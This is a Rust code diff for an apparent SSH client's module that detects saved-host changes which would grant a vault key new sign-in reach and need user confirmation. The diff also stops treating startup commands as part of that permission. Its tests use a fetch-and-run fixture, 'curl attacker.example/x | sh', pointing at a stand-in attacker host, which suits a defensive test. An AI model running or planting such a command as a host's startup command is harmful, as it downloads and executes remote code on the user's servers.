@@ -1,11 +1,15 @@
 //! Where the saved hosts let a vault key sign in.
 //!
 //! A host that authenticates with a vault key is a standing permission: connect
-//! to this server, as this account, with this key, and run this command on
-//! arrival. The store is written from the webview, so a write that grants a new
-//! one of those permissions is something the user has to confirm outside the
-//! page. This module decides which writes do, by comparing what the store
-//! allows before and after.
+//! to this server, as this account, with this key. The store is written from
+//! the webview, so a write that grants a new one of those permissions is
+//! something the user has to confirm outside the page. This module decides
+//! which writes do, by comparing what the store allows before and after.
+//!
+//! A host's startup command is not part of the permission. Once a vault key
+//! signs in somewhere, the page can open a session there and type whatever it
+//! likes, so a command on its own grants nothing new. It travels with a new
+//! reach only so the confirmation can show what will run on arrival.
 
 use crate::connection::credentials;
 use crate::host::{AuthMethod, Host};
@@ -14,23 +18,20 @@ use crate::store::StoreData;
 use std::collections::HashSet;
 use uuid::Uuid;
 
-/// One place a vault key signs in to, and what runs there once it has.
+/// One place a vault key signs in to.
 #[derive(Debug, Clone, PartialEq, Eq, Hash)]
 pub struct KeyReach {
     pub key_id: Uuid,
     pub username: String,
     pub hostname: String,
     pub port: u16,
-    /// `None` when nothing runs. An empty command is never sent, so it is the
-    /// same as none.
-    pub startup_command: Option<String>,
 }
 
 impl KeyReach {
-    /// What `host` lets a vault key do, resolved the way a connection resolves
-    /// it. `None` when the host does not sign in with a vault key: password
-    /// auth, agent auth, public-key auth with no key chosen, or a link to an
-    /// identity that is not stored, which a connection refuses.
+    /// Where `host` lets a vault key sign in, resolved the way a connection
+    /// resolves it. `None` when the host does not sign in with a vault key:
+    /// password auth, agent auth, public-key auth with no key chosen, or a link
+    /// to an identity that is not stored, which a connection refuses.
     pub fn of(host: &Host, identity: Option<&Identity>) -> Option<Self> {
         let resolved = credentials(host, identity).ok()?;
         if *resolved.auth != AuthMethod::PublicKey {
@@ -41,21 +42,21 @@ impl KeyReach {
             username: resolved.username.to_owned(),
             hostname: host.hostname.clone(),
             port: host.port,
-            startup_command: host
-                .startup_command
-                .clone()
-                .filter(|command| !command.is_empty()),
         })
     }
 }
 
-/// A saved host that would let a vault key do something no saved host lets it
-/// do yet.
+/// A saved host that would let a vault key sign in where no saved host lets it
+/// sign in yet.
 #[derive(Debug, Clone, PartialEq, Eq)]
 pub struct NewReach {
     pub host_id: Uuid,
     pub host_label: String,
     pub reach: KeyReach,
+    /// What the host runs once signed in, for the confirmation to show. `None`
+    /// when nothing runs; an empty command is never sent, so it is the same as
+    /// none.
+    pub startup_command: Option<String>,
 }
 
 fn reaches(data: &StoreData) -> impl Iterator<Item = (&Host, KeyReach)> {
@@ -71,9 +72,9 @@ fn reaches(data: &StoreData) -> impl Iterator<Item = (&Host, KeyReach)> {
 /// the user has not already allowed, while an edit to one identity is checked
 /// on every host that links it, and a removed identity is checked on every
 /// host that falls back to its own key. Any field that feeds the reach —
-/// hostname, port, account, auth method, key, identity link, startup command —
-/// is covered without being listed, because the reach is computed rather than
-/// diffed field by field.
+/// hostname, port, account, auth method, key, identity link — is covered
+/// without being listed, because the reach is computed rather than diffed field
+/// by field.
 ///
 /// Every stored host is considered, including a second record under an id
 /// already in use, so what is reported is never less than what a connection can
@@ -87,6 +88,10 @@ pub fn introduced(before: &StoreData, after: &StoreData) -> Vec<NewReach> {
             host_id: host.id,
             host_label: host.label.clone(),
             reach,
+            startup_command: host
+                .startup_command
+                .clone()
+                .filter(|command| !command.is_empty()),
         })
         .collect()
 }
@@ -146,8 +151,11 @@ mod tests {
                 username: "deploy".into(),
                 hostname: "attacker.example".into(),
                 port: 22,
-                startup_command: Some("curl attacker.example/x | sh".into()),
             }
+        );
+        assert_eq!(
+            found[0].startup_command.as_deref(),
+            Some("curl attacker.example/x | sh")
         );
     }
 
@@ -190,12 +198,11 @@ mod tests {
         let before = after(&StoreData::default(), |d| d.add_host(host.clone()));
 
         type Edit = fn(&mut Host);
-        let edits: [(&str, Edit); 5] = [
+        let edits: [(&str, Edit); 4] = [
             ("hostname", |h| h.hostname = "attacker.example".into()),
             ("port", |h| h.port = 2222),
             ("username", |h| h.username = "root".into()),
             ("key", |h| h.key_id = Some(Uuid::new_v4())),
-            ("startup command", |h| h.startup_command = Some("id".into())),
         ];
         for (field, edit) in edits {
             let mut changed = host.clone();
@@ -227,13 +234,32 @@ mod tests {
     }
 
     #[test]
-    fn an_empty_startup_command_is_the_same_as_none() {
+    fn a_startup_command_alone_introduces_nothing() {
+        // A session to the same destination can already run any command, so
+        // neither a new command on an allowed host nor a copy of it that runs
+        // something else grants anything.
         let host = key_host("prod", "prod.example", Uuid::new_v4());
         let before = after(&StoreData::default(), |d| d.add_host(host.clone()));
-        let mut emptied = host.clone();
-        emptied.startup_command = Some(String::new());
-        let after = after(&before, |d| d.update_host(emptied));
+
+        let mut changed = host.clone();
+        changed.startup_command = Some("curl attacker.example/x | sh".into());
+        let mut copy = changed.clone();
+        copy.id = Uuid::new_v4();
+        let after = after(&before, |d| {
+            d.update_host(changed);
+            d.add_host(copy);
+        });
         assert!(introduced(&before, &after).is_empty());
+    }
+
+    #[test]
+    fn an_empty_startup_command_is_reported_as_none() {
+        let mut host = key_host("prod", "prod.example", Uuid::new_v4());
+        host.startup_command = Some(String::new());
+        let after = after(&StoreData::default(), |d| d.add_host(host));
+        let found = introduced(&StoreData::default(), &after);
+        assert_eq!(found.len(), 1);
+        assert_eq!(found[0].startup_command, None);
     }
 
     #[test]
